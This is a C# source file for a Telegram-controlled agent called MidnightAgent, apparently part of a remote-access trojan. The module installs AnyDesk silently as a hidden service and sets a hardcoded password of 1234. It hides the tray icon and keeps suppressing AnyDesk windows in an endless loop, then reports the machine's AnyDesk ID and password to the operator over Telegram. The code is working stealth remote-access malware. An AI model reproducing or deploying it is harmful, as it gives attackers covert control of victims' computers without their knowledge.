using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Telegram;
using MidnightAgent.Utils;

namespace MidnightAgent.Features
{
    /// <summary>
    /// AnyDesk Remote Desktop Feature
    /// - Auto-download & install AnyDesk portable
    /// - Set password automatically
    /// - Retrieve AnyDesk ID
    /// - Stealth mode (hide UI & tray icon)
    /// - Start/Stop commands
    /// </summary>
    public class AnyDeskFeature : IFeature
    {
        public string Command => "any";
        public string Description => "Remote Desktop via AnyDesk (Unattended)";
        public string Usage => "/any start | stop | status | id";
        
        public static TelegramService TelegramInstance { get; set; }
        private static readonly string WorkingDir = @"C:\Users\Public\MidnightAnyDesk";
        private static readonly string ANYDESK_URL = "https://download.anydesk.com/AnyDesk.exe";
        

        private static string _anydeskId = "";

        // ===== Main Entry Point =====
        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0)
            {
                return FeatureResult.Fail(
                    "🖥️ <b>AnyDesk Commands:</b>\n" +
                    "/any start - Install & start AnyDesk\n" +
                    "/any stop - Stop AnyDesk\n" +
                    "/any status - Check status\n" +
                    "/any id - Get ID"
                );
            }

            string subCommand = args[0].ToLower();

            try
            {
                switch (subCommand)
                {
                    case "start":
                        await StartAnyDesk();
                        break;

                    case "stop":
                        StopAnyDesk();
                        break;

                    case "status":
                        CheckStatus();
                        break;

                    case "id":
                        GetIdAndPassword();
                        break;

                    default:
                        return FeatureResult.Fail("❌ Unknown command. Use: start, stop, status, id");
                }

                return FeatureResult.Ok();
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"❌ <b>Error:</b> {ex.Message}");
            }
        }

        // ===== START ANYDESK =====
        private async Task StartAnyDesk()
        {
            try
            {
                Directory.CreateDirectory(WorkingDir);
                string anydeskExe = Path.Combine(WorkingDir, "AnyDesk.exe");

                // Step 1: Download AnyDesk if needed
                if (!File.Exists(anydeskExe))
                {
                    TelegramInstance?.SendMessage("⬇️ <b>(1/5) Downloading AnyDesk...</b>");
                    using (var client = new WebClient())
                    {
                        await client.DownloadFileTaskAsync(ANYDESK_URL, anydeskExe);
                    }
                    await Task.Delay(2000);
                }
                else
                {
                    TelegramInstance?.SendMessage("✅ <b>(1/5) AnyDesk Ready</b>");
                }

                // Step 2: Full Cleanup (Uninstall > Kill > Delete Files)
                TelegramInstance?.SendMessage("🧹 <b>(2/5) Cleaning old installation...</b>");
                
                // Uninstall service first if exists
                Process.Start(new ProcessStartInfo {
                    FileName = anydeskExe, Arguments = "--remove", CreateNoWindow=true, WindowStyle=ProcessWindowStyle.Hidden 
                })?.WaitForExit(3000);
                
                KillAnyDesk();
                CleanupAnyDeskConfig(anydeskExe);
                await Task.Delay(1000);

                // Step 3: PRE-SEED CONFIGURATION (Minimal Safe Config)
                // Remove complex ACL/Interactive keys that might trigger "Logon disallowed"
                TelegramInstance?.SendMessage("⚙️ <b>(3/5) Writing Safe Config...</b>");
                
                string programDataDir = @"C:\ProgramData\AnyDesk";
                Directory.CreateDirectory(programDataDir);
                
                // Only essential setting: Hide Tray + Enable Unattended
                // Reliance on defaults for connection permission (defaults are usually Allow)
                string seedConfig = @"ad.tray-icon.visible=0
ad.ui.start_with_win=0
ad.ui.show_on_startup=0
ad.security.unattended_access.enable=1
ad.roaming.allow_incoming=1
";
                File.WriteAllText(Path.Combine(programDataDir, "system.conf"), seedConfig);
                
                // Also seed user config
                string appDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "AnyDesk");
                Directory.CreateDirectory(appDataDir);
                File.WriteAllText(Path.Combine(appDataDir, "user.conf"), seedConfig);

                await Task.Delay(1000);

                // Step 4: Install AnyDesk Service
                TelegramInstance?.SendMessage("🚀 <b>(4/5) Installing Service...</b>");
                StartAnydeskProcess(anydeskExe);
                await Task.Delay(5000); // Allow service to settle

                // Step 5: Set Password & Get ID
                TelegramInstance?.SendMessage("🔑 <b>(5/5) Setting Password...</b>");
                EnableUnattendedAccess(anydeskExe);
                await Task.Delay(2000);

                _anydeskId = GetAnydeskId(anydeskExe);
                
                if (!string.IsNullOrEmpty(_anydeskId))
                {
                    TelegramInstance?.SendMessage(
                        $"✅ <b>AnyDesk Ready!</b>\n" +
                        $"🆔 <b>ID:</b> <code>{_anydeskId}</code>\n" +
                        $"🔑 <b>Password:</b> <code>1234</code>\n" +
                        $"🛡️ <i>Config Pre-seeded</i>"
                    );
                }
                else
                {
                    TelegramInstance?.SendMessage("⚠️ <b>AnyDesk started but ID missing. Try /any id</b>");
                }

                // Step 6: Post-Cleanup (Hide UI)
                await Task.Delay(1000);
                HideAnydeskWindows();
            }
            catch (Exception ex)
            {
                TelegramInstance?.SendMessage($"❌ <b>AnyDesk Error:</b> {ex.Message}");
            }
        }

        // ===== CLEANUP & RESET CONFIG =====
        private void CleanupAnyDeskConfig(string anydeskExe)
        {
            try
            {
                // Config paths
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                
                string[] configPaths = new[]
                {
                    Path.Combine(appData, "AnyDesk", "user.conf"),
                    Path.Combine(appData, "AnyDesk", "system.conf"),
                    Path.Combine(programData, "AnyDesk", "user.conf"),
                    Path.Combine(programData, "AnyDesk", "system.conf"),
                    Path.Combine(Path.GetDirectoryName(anydeskExe), "user.conf"),
                    Path.Combine(Path.GetDirectoryName(anydeskExe), "system.conf")
                };

                foreach (var path in configPaths)
                {
                    try 
                    { 
                        if (File.Exists(path)) File.Delete(path); 
                        
                        // Create directory if needed
                        string dir = Path.GetDirectoryName(path);
                        if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    } 
                    catch { }
                }
            }
            catch { }
        }

        // ===== CONFIGURE STEALTH MODE & UNATTENDED ACCESS =====
        private void ConfigureStealth(string anydeskExe)
        {
            try
            {
                // Minimal Safe Config (Same as Pre-seed)
                string fullConfig = @"ad.tray-icon.visible=0
ad.ui.start_with_win=0
ad.ui.show_on_startup=0
ad.security.unattended_access.enable=1
ad.roaming.allow_incoming=1
";

                // Write to all possible locations
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string workDir = Path.GetDirectoryName(anydeskExe);

                var targetDirs = new[] { 
                    Path.Combine(appData, "AnyDesk"), 
                    Path.Combine(programData, "AnyDesk"),
                    workDir 
                };

                foreach (var dir in targetDirs)
                {
                    try 
                    {
                        if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                        File.WriteAllText(Path.Combine(dir, "system.conf"), fullConfig);
                        File.WriteAllText(Path.Combine(dir, "user.conf"), fullConfig);
                    }
                    catch { }
                }

                // Remove from startup
                RemoveStartupEntries();
            }
            catch { }
        }

        // ===== ENABLE UNATTENDED ACCESS (PIPE METHOD) =====
        private void EnableUnattendedAccess(string anydeskExe)
        {
            try
            {
                // Method 1: Echo pipe (Standard)
                // echo 1234 | AnyDesk.exe --set-password
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c echo 1234 | \"{anydeskExe}\" --set-password",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi)?.WaitForExit(5000);

                // Method 2: Direct Argument (Fallback)
                Thread.Sleep(1000);
                 Process.Start(new ProcessStartInfo
                {
                    FileName = anydeskExe,
                    Arguments = "--set-password 1234",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                })?.WaitForExit(3000);
            }
            catch { }
        }

        // ===== STOP ANYDESK =====
        private void StopAnyDesk()
        {
            try
            {
                TelegramInstance?.SendMessage("🛑 <b>Stopping AnyDesk...</b>");
                
                // Kill all AnyDesk processes
                KillAnyDesk();
                _anydeskId = "";
                
                // Remove from startup
                RemoveStartupEntries();
                
                // Remove shortcuts
                RemoveShortcuts();

                TelegramInstance?.SendMessage("✅ <b>AnyDesk Stopped & Cleaned</b>");
            }
            catch (Exception ex)
            {
                TelegramInstance?.SendMessage($"❌ <b>Stop Error:</b> {ex.Message}");
            }
        }

        // ===== KILL ANYDESK PROCESSES =====
        private void KillAnyDesk()
        {
            try
            {
                var processes = Process.GetProcessesByName("AnyDesk");
                foreach (var proc in processes)
                {
                    try
                    {
                        proc.Kill();
                        proc.WaitForExit(5000);
                    }
                    catch { }
                }
            }
            catch { }
        }

        // ===== CHECK STATUS =====
        private void CheckStatus()
        {
            try
            {
                var processes = Process.GetProcessesByName("AnyDesk");
                bool isRunning = processes.Length > 0;

                if (isRunning)
                {
                    TelegramInstance?.SendMessage(
                        $"✅ <b>AnyDesk Running (Unattended)</b>\n" +
                        $"🆔 <b>ID:</b> <code>{_anydeskId}</code>\n" +
                        $"� <b>Password:</b> <i>None</i>"
                    );
                }
                else
                {
                    TelegramInstance?.SendMessage("❌ <b>AnyDesk Not Running</b>");
                }
            }
            catch (Exception ex)
            {
                TelegramInstance?.SendMessage($"❌ <b>Status Error:</b> {ex.Message}");
            }
        }

        // ===== GET ID & PASSWORD =====
        private void GetIdAndPassword()
        {
            try
            {
                if (string.IsNullOrEmpty(_anydeskId))
                {
                    string anydeskExe = Path.Combine(WorkingDir, "AnyDesk.exe");
                    if (File.Exists(anydeskExe))
                    {
                        _anydeskId = GetAnydeskId(anydeskExe);
                    }
                }

                if (!string.IsNullOrEmpty(_anydeskId))
                {
                    TelegramInstance?.SendMessage(
                        $"🆔 <b>AnyDesk ID:</b> <code>{_anydeskId}</code>\n" +
                        $"� <b>Password:</b> <i>None (Unattended Access)</i>"
                    );
                }
                else
                {
                    TelegramInstance?.SendMessage("❌ <b>AnyDesk not running or ID not available</b>");
                }
            }
            catch (Exception ex)
            {
                TelegramInstance?.SendMessage($"❌ <b>Error:</b> {ex.Message}");
            }
        }

        // ===== GENERATE RANDOM PASSWORD =====
        private static string GeneratePassword()
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, 8).Select(s => s[random.Next(s.Length)]).ToArray());
        }
        // ===== REMOVE STARTUP ENTRIES =====
        private void RemoveStartupEntries()
        {
            try
            {
                // Remove from registry startup
                string[] startupKeys = new[]
                {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
                };

                foreach (string keyPath in startupKeys)
                {
                    try
                    {
                        using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(keyPath, true))
                        {
                            key?.DeleteValue("AnyDesk", false);
                        }

                        using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath, true))
                        {
                            key?.DeleteValue("AnyDesk", false);
                        }
                    }
                    catch { }
                }

                // Remove from Startup folder
                string[] startupFolders = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup)
                };

                foreach (string folder in startupFolders)
                {
                    try
                    {
                        string[] shortcuts = Directory.GetFiles(folder, "*AnyDesk*.lnk");
                        foreach (string shortcut in shortcuts)
                        {
                            File.Delete(shortcut);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        // ===== REMOVE SHORTCUTS =====
        private void RemoveShortcuts()
        {
            try
            {
                // Start Menu locations
                string[] startMenuPaths = new[]
                {
                    @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\AnyDesk",
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu) + @"\Programs\AnyDesk",
                    Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\Programs\AnyDesk",
                    Environment.GetFolderPath(Environment.SpecialFolder.Programs) + @"\AnyDesk"
                };

                foreach (string path in startMenuPaths)
                {
                    if (Directory.Exists(path))
                    {
                        Directory.Delete(path, true);
                    }
                }

                // Individual shortcuts
                string[] shortcutPaths = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu) + @"\Programs\AnyDesk.lnk",
                    Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\Programs\AnyDesk.lnk",
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\AnyDesk.lnk",
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\AnyDesk.lnk"
                };

                foreach (string shortcut in shortcutPaths)
                {
                    if (File.Exists(shortcut))
                    {
                        File.Delete(shortcut);
                    }
                }
            }
            catch { }
        }

        // ===== START ANYDESK PROCESS =====
        private void StartAnydeskProcess(string anydeskExe)
        {
            try
            {
                // Install AnyDesk silently (creates service)
                var installProc = Process.Start(new ProcessStartInfo
                {
                    FileName = anydeskExe,
                    Arguments = "--install C:\\ProgramData\\AnyDesk --silent --start-with-win",
                    WorkingDirectory = Path.GetDirectoryName(anydeskExe),
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                installProc?.WaitForExit(10000);
                
                Thread.Sleep(2000);
                
                // Start service in background (NO UI)
                var startProc = Process.Start(new ProcessStartInfo
                {
                    FileName = anydeskExe,
                    Arguments = "--silent",
                    WorkingDirectory = Path.GetDirectoryName(anydeskExe),
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = false,
                    RedirectStandardError = false
                });
                
                // Kill any UI processes immediately
                Thread.Sleep(1000);
                KillAnydeskUI();
            }
            catch { }
        }
        
        // ===== KILL ANYDESK UI PROCESSES =====
        private void KillAnydeskUI()
        {
            try
            {
                // Kill AnyDesk.exe processes (UI) but keep the service
                foreach (var proc in Process.GetProcessesByName("AnyDesk"))
                {
                    try
                    {
                        // Check if it's UI process (has window or is not service)
                        if (proc.MainWindowHandle != IntPtr.Zero || proc.MainWindowTitle.Length > 0)
                        {
                            proc.Kill();
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        // ===== GET ANYDESK ID =====
        private string GetAnydeskId(string anydeskExe)
        {
            try
            {
                // Try multiple times with delays
                for (int attempt = 0; attempt < 5; attempt++)
                {
                    try
                    {
                        var proc = Process.Start(new ProcessStartInfo
                        {
                            FileName = anydeskExe,
                            Arguments = "--get-id",
                            WorkingDirectory = Path.GetDirectoryName(anydeskExe),
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });

                        if (proc != null)
                        {
                            string output = proc.StandardOutput.ReadToEnd();
                            proc.WaitForExit(10000);

                            // Parse ID from output (format: "123456789" or similar)
                            var match = Regex.Match(output, @"\d{9,}");
                            if (match.Success)
                            {
                                return match.Value.Trim();
                            }
                        }
                    }
                    catch { }
                    
                    // Wait before retry
                    Thread.Sleep(2000);
                }
            }
            catch { }

            return "";
        }

        // ===== HIDE ANYDESK WINDOWS =====
        private void HideAnydeskWindows()
        {
            try
            {
                // Hide all AnyDesk windows multiple times
                for (int i = 0; i < 5; i++)
                {
                    var processes = Process.GetProcessesByName("AnyDesk");
                    foreach (var proc in processes)
                    {
                        try
                        {
                            if (proc.MainWindowHandle != IntPtr.Zero)
                            {
                                WindowHelper.HideWindow(proc.MainWindowHandle);
                            }
                        }
                        catch { }
                    }
                    Thread.Sleep(500);
                }
                
                // Start continuous hiding task
                Task.Run(() =>
                {
                    while (true)
                    {
                        try
                        {
                            var processes = Process.GetProcessesByName("AnyDesk");
                            foreach (var proc in processes)
                            {
                                try
                                {
                                    if (proc.MainWindowHandle != IntPtr.Zero)
                                    {
                                        WindowHelper.HideWindow(proc.MainWindowHandle);
                                    }
                                }
                                catch { }
                            }
                        }
                        catch { }
                        Thread.Sleep(1000); // Check every second
                    }
                });
            }
            catch { }
        }
    }
}
